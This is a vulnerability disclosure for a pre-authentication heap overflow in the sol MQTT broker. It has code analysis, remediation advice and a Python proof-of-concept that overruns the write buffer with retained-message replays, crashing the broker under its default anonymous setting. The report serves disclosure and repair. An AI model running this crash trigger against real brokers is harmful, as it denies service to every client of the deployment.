# Pre-authentication heap buffer overflow via unbounded appends to the per-client MQTT write buffer

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-11-17 10:12:24 UTC
**Target:** sol MQTT broker (C, v0.18.5) - src/
**Endpoint:** MQTT SUBSCRIBE handler (src/handlers.c subscribe_handler, memcpy at line 617)
**Method:** MQTT SUBSCRIBE (raw TCP)
**CWE:** CWE-787
**CVSS:** 8.2
**Confidence:** High
**Fix Effort:** Medium

## Description

The broker allocates each client's write buffer at exactly `max_request_size` bytes but no code path ever checks whether the next packet fits, so protocol messages larger than the remaining space are written past the end of the heap allocation. A single unauthenticated SUBSCRIBE that replays retained messages - or a session resume, or a QoS retransmit - overruns the buffer with bytes the attacker chose, and the shipped configuration crashes. The same unchecked append exists at twelve further write sites, so the buffer can also be overrun by ordinary protocol traffic once it is nearly full.

## Impact

An unauthenticated network peer can write attacker-chosen bytes of attacker-chosen length beyond a heap allocation inside the broker process, and reliably terminates the service. Demonstrated consequences are heap corruption outside the `wbuf` object (the overflowed bytes were proven to be the attacker's own PUBLISH payload, landing at `wbuf+908` in a 1024-byte buffer) and process death: AddressSanitizer aborts, and the plain optimized build exits with SIGSEGV on the same input. Because the broker is the single broker in the deployment, every connected client loses its session and message flow, giving a trivial denial of service against all tenants. The write primitive also reaches adjacent heap objects and `write_data()` will transmit `towrite - wrote` bytes from `wbuf`, so out-of-bounds read/disclosure of neighbouring heap contents is reachable once the length tracker is corrupted; that read-back and control-flow hijack were not demonstrated and are not scored here.

## Counterevidence

The strongest arguments against this finding were checked explicitly. (1) "It is only an artefact of the small test `max_request_size`": the identical sequence was reproduced at 1 MB and at the shipped 50 MB value, producing writes of 3010 and 1048587 bytes past the respective buffers. (2) "It only happens because AddressSanitizer changes timing or allocation layout": the plain optimized build, with no sanitizer, dies with SIGSEGV on the same input while the one-tuple control on the same binary stays alive, and the gdb run shows the overflowing bytes are the attacker payload. (3) "Some upstream control must bound `towrite`": every producer of outbound bytes was enumerated (`grep` over `mqtt_pack`, `mqtt_pack_mono`, `memcpy` into `wbuf`); before the fix not one of the fourteen sites compared `towrite` with `max_request_size`, and the only inbound limit (`pktlen <= max_request_size` in `recv_packet`) constrains a single packet rather than the accumulated replays. (4) "The retained payload cannot be that large": the retained blob is a serialized copy of an attacker PUBLISH, which is itself limited only by `max_request_size`, and duplicate SUBSCRIBE tuples replay the same blob once per tuple, so the sum is unbounded by any single-packet check. (5) "Dropping records on overflow could hide a real message loss bug": the drop is logged and only affects the connection that filled its own buffer; the smoke test and the persistent-session regression checks pass unchanged. Not demonstrated, and therefore not scored: conversion of the write primitive into control-flow hijack, and reading back adjacent heap through the oversized `towrite`. No WAF, filter, or validation stands between the peer and these write sites.

## What Would Change This Severity

Demonstrating that the out-of-bounds write reaches an object used later for dispatch - for example reclaiming the adjacent chunk with attacker data so the overwritten bytes land in a function pointer or `struct ref` free callback - would raise this from high to critical by adding control-flow impact to the existing crash; conversely, evidence that the deployment exposes the broker only over a UNIX socket or behind a peer-authenticated proxy that no untrusted client can reach would lower it to medium.

## Technical Analysis

`client_init()` sizes the write buffer with exactly `conf->max_request_size` bytes and only ever resets the write cursor:

```c title=src/server.c startLineNumber=395 endLineNumber=399
    client->wrote   = ATOMIC_VAR_INIT(0);
    client->towrite = ATOMIC_VAR_INIT(0);
    if (!client->wbuf)
        client->wbuf =
            try_calloc(conf->max_request_size, sizeof(unsigned char));
```

No write site compares `c->towrite + len` against that size. The highest-impact sink is the retained-message replay in `subscribe_handler`, which copies a stored, attacker-created PUBLISH into the buffer once per decoded SUBSCRIBE tuple:

```c title=src/handlers.c startLineNumber=613 endLineNumber=619
        // Retained message? Publish it
        // TODO move after SUBACK response
        if (t->retained_msg) {
            size_t len = alloc_size(t->retained_msg);
            memcpy(c->wbuf + c->towrite, t->retained_msg, len);
            c->towrite += len;
        }
```

`len` comes from `alloc_size(t->retained_msg)`, i.e. the size of a serialized PUBLISH that the attacker produced via `publish_handler` (`t->retained_msg = try_alloc(mqtt_size(&e->data, NULL)); mqtt_pack(&e->data, t->retained_msg);`), and `topic_store_get_or_put` returns the same `struct topic *` for a repeated topic name, so duplicate tuples replay the same blob repeatedly. The only bound applied to inbound packets is `pktlen <= max_request_size` in `recv_packet`, which constrains a single PUBLISH, not the sum of the replays.

The same unchecked pattern appears at every other producer of outbound bytes, which is why the defect is a property of the buffer contract rather than of one handler. `set_connack()` even carried the missing check as a TODO:

```c title=src/handlers.c startLineNumber=330 endLineNumber=338
        // TODO check for write buffer size exceed
        if (list_size(c->session->outgoing_msgs) > 0) {
            size_t len = 0;
            list_foreach(item, c->session->outgoing_msgs)
            {
                len = mqtt_size(item->data, NULL);
                mqtt_pack(item->data, c->wbuf + c->towrite);
                c->towrite += len;
            }
```

and the inflight retransmit timer repacks every unacknowledged message and every pending ack in one pass:

```c title=src/server.c startLineNumber=336 endLineNumber=339
                size = mqtt_size(c->session->i_msgs[i].packet, NULL);
                // Serialize the packet and send it out again
                mqtt_pack(p, c->wbuf + c->towrite);
                c->towrite += size;
```

The ACK branch of that timer (line 354) additionally sized `&ack` but packed `p`, so the reservation and the write disagreed even when a bound was applied - that mismatch is fixed as part of the same site.

Finally, the corrupted `towrite` is consumed by the writer without any clamp, so the effect does not stop at the memcpy: `send_data(&c->conn, c->wbuf + c->wrote, c->towrite - c->wrote);` transmits past the allocation. `git blame` on the retained-replay lines attributes them to the bulk import commit that introduced the broker (`6c4db6f`, "Import code"), i.e. this is original code, not a regression.

Three sinks were reproduced end to end, all pre-authentication under the default `allow_anonymous true` posture, and all sharing the single root cause: no producer ever establishes `towrite + len <= max_request_size` before writing.

## Proof of Concept

1. Build the broker with AddressSanitizer and start it on 127.0.0.1 with `max_request_size 1024`, `allow_anonymous true`.
2. Open a first connection and publish two retained PUBLISH packets (`a/000`, `a/001`) with a 900-byte payload; each stored retained blob serializes to 910 bytes.
3. Open a second connection and send one SUBSCRIBE packet carrying both topic tuples at QoS 0.
4. The replay loop copies 910 bytes at offset 0 and then 910 bytes at offset 910 into a 1024-byte heap buffer: AddressSanitizer reports a `heap-buffer-overflow` WRITE of size 910 immediately after the 1032-byte region (1024 bytes plus the allocator header) at `src/handlers.c:617`, and the process aborts.
5. Repeat with one tuple only (910 bytes, fits): the broker stays alive and no sanitizer report is produced, confirming the trigger is the unbounded append rather than the retained-message feature.
6. Repeat against the plain optimized build with six tuples: the broker exits with SIGSEGV (status -11) instead of an ASan abort, confirming a production-build crash.
7. Scale the same sequence to `max_request_size` 1 MB (400 retained messages of 3000 bytes, 400 tuples) and to the shipped 50 MB (52 retained messages of 1 MiB) to confirm the defect is not an artefact of the small test configuration.

```python
#!/usr/bin/env python3
"""Heap-buffer-overflow in the broker write buffer via retained-message replay.

Every write into c->wbuf (allocated with exactly max_request_size bytes in
client_init) appends at c->wbuf + c->towrite without checking that the record
fits. subscribe_handler replays each subscribed topic's retained message with an
unbounded memcpy, once per decoded SUBSCRIBE tuple, so one SUBSCRIBE carrying N
tuples with retained messages copies sum(len) bytes into the buffer.

The script starts its own broker on 127.0.0.1 with a small max_request_size,
publishes two retained messages whose packed sizes together exceed the buffer,
then subscribes to both topics in a single packet.
"""
import os
import re
import shutil
import socket
import subprocess
import sys
import time

# mqttclient.py ships with the local test harness (minimal MQTT v3.1.1 client)
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "harness"))
import mqttclient as M  # noqa: E402

HOST = "127.0.0.1"
PORT = int(os.environ.get("POC_PORT", "18891"))
RUN = os.environ.get("POC_RUN", "/tmp/sol-poc/run-wbuf")
BIN = os.environ.get("POC_BIN", "./sol")
MAX_REQ = int(os.environ.get("POC_MAXREQ", "1024"))
PAYLOAD_LEN = int(os.environ.get("POC_PAYLOAD", "900"))
NT = int(os.environ.get("POC_NTOPICS", "2"))
MAX_MEM = os.environ.get("POC_MAXMEM", "256MB")
PATTERN = b"A"  # 0x41 marker so the report/dump shows our bytes


def write_config():
    os.makedirs(RUN + "/asan", exist_ok=True)
    for f in os.listdir(RUN + "/asan"):
        os.unlink(os.path.join(RUN + "/asan", f))
    conf = f"""ip_address {HOST}
ip_port {PORT}
log_level DEBUG
log_path {RUN}/sol.log
max_memory {MAX_MEM}
max_request_size {MAX_REQ}
tcp_backlog 128
stats_publish_interval 600s
allow_anonymous true
"""
    with open(RUN + "/sol.conf", "w") as f:
        f.write(conf)


def start_broker():
    write_config()
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = (
        f"abort_on_error=1:detect_leaks=0:log_path={RUN}/asan/report"
        ":print_stacktrace=1:handle_abort=1"
    )
    env["UBSAN_OPTIONS"] = f"halt_on_error=1:print_stacktrace=1:log_path={RUN}/asan/report"
    env.pop("LD_PRELOAD", None)
    out = open(RUN + "/broker.out", "wb")
    p = subprocess.Popen([BIN, "-c", RUN + "/sol.conf"], stdout=out,
                         stderr=subprocess.STDOUT, env=env, cwd=RUN)
    for _ in range(100):
        if p.poll() is not None:
            raise SystemExit("broker exited during startup, see %s/broker.out" % RUN)
        try:
            s = socket.create_connection((HOST, PORT), timeout=0.2)
            s.close()
            return p
        except OSError:
            time.sleep(0.1)
    raise SystemExit("broker did not open port")


def report():
    txt = ""
    d = RUN + "/asan"
    for f in sorted(os.listdir(d)):
        txt += open(os.path.join(d, f), errors="replace").read()
    try:
        txt += open(RUN + "/broker.out", errors="replace").read()
    except OSError:
        pass
    return txt


def conn(cid, clean=True):
    c = M.MQTTConn(HOST, PORT, timeout=3.0)
    c.send(M.connect_packet(cid, clean_session=clean))
    pkt = c.recv_packet()
    assert pkt[0] == 0x20, pkt
    return c, pkt[1]


def main():
    shutil.rmtree(RUN, ignore_errors=True)
    os.makedirs(RUN, exist_ok=True)
    broker = start_broker()
    payload = PATTERN * PAYLOAD_LEN
    topics = ["a/%03d" % i for i in range(NT)]
    try:
        pub, _ = conn("wbuf-pub")
        for t in topics:
            pub.send(M.publish_packet(t, payload, qos=0, retain=True))
        time.sleep(0.5)

        sub, _ = conn("wbuf-sub")
        sub.send(M.subscribe_packet(1, [(t, 0) for t in topics]))
        print("SUBSCRIBE sent: tuples=%s payload=%dB each, wbuf=%dB"
              % (topics, PAYLOAD_LEN, MAX_REQ))
        time.sleep(1.5)
        alive = broker.poll() is None
        print("broker alive after subscribe:", alive,
              "" if alive else "(exit status %s)" % broker.returncode)
        if os.environ.get("POC_PROVOKE"):
            # extra traffic so a production allocator trips over the corrupted
            # chunk while servicing/freeing neighbours
            for i in range(5):
                try:
                    c, _ = conn("provoke-%d" % i)
                    c.send(M.subscribe_packet(1, [("provoke/%d" % i, 0)]))
                except Exception as exc:  # noqa: BLE001
                    print("provoke %d failed: %s" % (i, type(exc).__name__))
                    break
                time.sleep(0.1)
            time.sleep(0.5)
            print("broker alive after provoke:", broker.poll() is None,
                  "" if broker.poll() is None else "(exit status %s)" % broker.returncode)
    finally:
        time.sleep(0.5)
        if broker.poll() is None:
            broker.terminate()
            try:
                broker.wait(3)
            except subprocess.TimeoutExpired:
                broker.kill()

    rep = report()
    m = re.search(r"(==\d+==ERROR: AddressSanitizer.*?)(?=\n==\d+==(?:ABORTING|ERROR)|\Z)",
                  rep, re.S)
    if m:
        print("\n===== VERBATIM ASAN REPORT =====")
        print(m.group(1)[:4000])
        sys.exit(0)
    print("\n===== NO ASAN REPORT =====")
    print(rep[-3000:])
    sys.exit(1)


if __name__ == "__main__":
    main()
```

## Remediation

Introduce a single bounded append primitive for the per-client write buffer and route every producer of outbound bytes through it. The helper must compare the requested length against both the configured buffer size and the bytes already pending, advance the write cursor only when the record fits, and otherwise drop the record and log the event so no caller can write past the allocation. The comparison has to be overflow-safe, which means testing `len > limit - used` rather than `used + len > limit`, and it must also handle a cursor that is already beyond the limit. Apply the helper at every site that serialises into the buffer, not only at the retained-message replay: retained replay, session-resume flush, publish fan-out, the inflight retransmit of messages and of acks, and the fixed-size CONNACK, SUBACK, UNSUBACK, PUBACK/PUBREC, PUBREL, PUBCOMP and PINGRESP appends. The small fixed-size appends matter because a buffer filled to within a few bytes by a large record is overrun by the acknowledgement that follows it. Because the same buffer is drained by the socket writer using the pending-bytes counter, the helper is also what keeps that send within bounds; no separate clamp is needed once no site can advance the cursor past the limit. The inflight ACK retransmit additionally has to pack the packet whose size was computed, rather than an unrelated packet, otherwise a correctly sized reservation is still overrun by a larger write. Finally, build the acknowledgement header from the recorded QoS instead of leaving the packet header uninitialised, so the retransmit serialises a well-defined packet. Consider raising `max_request_size` awareness in the protocol layer - for example refusing to replay more retained data than can fit in one write cycle and resuming later - so that a legitimate large subscription degrades gracefully instead of silently dropping replies.

## Assumptions

The broker listens on a TCP port and `allow_anonymous` is true, which is the shipped default in `conf/sol.conf` and in the container entrypoint (`./sol -a 0.0.0.0`); no credentials are needed for the vulnerable path. When `allow_anonymous` is false the same handlers are still reachable with any single valid low-privilege credential, because no per-topic or per-client authorization exists. Three PUBLISH packets plus one SUBSCRIBE are required for the retained-replay variant; the resume and retransmit variants need one persistent client and a 20-second timer.
